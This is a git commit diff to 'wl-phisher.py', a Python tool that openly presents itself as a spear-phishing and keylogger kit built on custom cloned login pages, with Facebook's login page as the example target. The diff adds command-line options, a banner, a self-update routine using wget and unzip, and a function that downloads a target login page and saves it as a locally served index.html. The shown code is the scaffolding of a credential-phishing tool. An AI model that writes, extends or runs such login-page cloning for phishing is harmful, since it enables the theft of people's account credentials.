91eeac3d6e5f2e60d671da3a95fa9feaf78087d5
zexceed12300 <36181923+zexceed12300@users.noreply.github.com>
2019-07-31 21:53:43 +0700

    Update wl-phisher v1.1

--- wl-phisher.py
+++ wl-phisher.py
@@ -1,9 +1,14 @@
 import requests
 import os
+import sys
+import time
 import random
 import string
+import argparse
+import subprocess as subp
 from bs4 import BeautifulSoup
 
+version = "1.1 (Beta)"
 url = ""
 form_action = ""
 form_action_second = ""
@@ -11,12 +16,84 @@ str_line_second = ""
 str_line = ""
 lenght = ""
 
-def cloning():
-    index_file = open("./HTTPServer/index.html", "w")
+def echo(x):
+    tc = {"d":"0","m":"31","h":"32","c":"36","B":"34","y":"33"}
+    for i in tc:
+        x = x.replace("\%s" %i, "\033[1;%s;48m" %tc[i])
+    x = x.replace("\cl", "\033[1;0;0m")
+    print(x)
+
+def update():
+    echo("\c[*] Checking Version This Tool ...\d")
+    time.sleep(1)
+    echo("\h[+] %s\d" %version)
+    echo("\c[*] Checking Update ...\d")
+    checking = requests.get("https://raw.githubusercontent.com/zexceed12300/wl-phisher/master/Update")
+    r = BeautifulSoup(checking.text, "html.parser")
+    s = str(r)
+    if "1.0 (Beta)" in s:
+        echo("\h[+] No Update, This tool is latest version\d")
+        sys.exit()
+    else:
+        update = input("\033[1;33;48m[?] Version %s Is Available, Update Now?[y/n] \033[1;0;0m" %s)
+        if "y" in update:
+            echo("\m[+] Downloading Package ...")
+            with open('Update.log', 'w') as updatelog:
+                subp.Popen(['wget', 'https://codeload.github.com/zexceed12300/wl-phisher/zip/master'], stderr=updatelog, stdout=updatelog)
+                time.sleep(1)
+                echo("\m[+] Unpacking Package ...")
+                time.sleep(1)
+                subp.Popen(['unzip', 'master'], stderr=updatelog, stdout=updatelog)
+                echo("\c[*] Finished.\d")
+            sys.exit()
+        else:
+            sys.exit()
+
+def usage():
+    echo("""
+           \h_\d    \y_ ____\d  \m_\d      \y_ ____\d   \m_\d
+ \h _     _ | |\d     \m____ | |     _  ____ | |     ____  ___\d
+ \h| | _ | || |\d \y__\d \m|  _ || |___ |_||  __|| |___ |  _ ||  _|\d
+ \h| || || || |\d\y|__|\d\m|  __||  _  || ||__  ||  _  ||  __|| |\d
+ \h\_______/|_|\d    \m| |   |_| |_||_||____||_| |_||____||_|\d
+     \y_ ____\d      \m|_|\d \cWeb-Login Phisher v1.1 Beta\d \y_ _____\d
+               
+          \h[ \ySpear Phising Keylogger Attack With\d \h] 
+               [ \yCustom Cloned Login Page\d \h]\d
+\h---------------------------------------------------------\d
+\h[+] Developer\d  \y:\d Xenz@Zexceed12300
+\h[+] Contact me\d \y:\d https://www.facebook.com/profile.php?id=100011531026694
+\h[+] Github\d     \y:\d https://github.com/zexceed12300
+\h[+] Version\d    \y:\d 1.1 (Beta)
+\h_________________________________________________________\d               
+               """)
+usage()
+
+def get_parameters():
     global url
-    url = input("[?] URL_WEBSITE : ")
-    print("[~] Cloning Website ...")
-    response = requests.get(url)
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-u", "--url", help='URL page login (e.g. "https://facebook.com/login.php")')
+    parser.add_argument("-V", "--version", help='Check version/update', action="store_true")
+    args = parser.parse_args()
+    url = str(args.url)
+
+    if args.version:
+        update()
+
+get_parameters()
+
+def cloning():
+    global url
+    index_file = open("./HTTPServer/index.html", "w")
+    echo("\B[*] Cloning Website ...\d")
+    try:
+        response = requests.get(url)
+    except requests.exceptions.MissingSchema:
+        print('[!] URL "%s" Does not exist' %url)
+        sys.exit()
+    except requests.exceptions.ConnectionError:
+        print('[!] URL "%s" Does not exist' % url)
+        sys.exit()
     element = BeautifulSoup(response.text, "html.parser")
     content = str(element)
     index_file.write(content)
